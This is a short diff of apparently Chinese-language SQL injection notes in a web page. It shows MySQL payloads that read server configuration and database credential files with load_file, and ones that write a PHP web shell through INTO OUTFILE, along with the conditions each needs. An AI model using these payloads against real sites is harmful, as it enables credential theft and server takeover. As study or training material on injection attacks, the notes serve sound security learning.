@@ -360,8 +360,7 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
  读/etc/init.d下的东西，这里有配置文件路径
 ?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
 ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
-?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 into outfile getshell  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
-当知道路径时，可以直接用  id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;) id=1 into outfile 'C:/phpStudy/WWW/a.
+?id=1' union select 1,2,load_file('/site/xxx.com/conf/conn.inc.php')    0x01 load data local infile 读文件  条件:  MySQL8 中需要 SET GLOBAL local_infile=1;   语句  LOAD DATA LOCAL INFILE 'D:/pet.txt' INTO TABLE pet FIELDS TERMINATED BY ''; select * from pet;  0x02 into outfile getshell  条件：  1.
     </p>
 
     
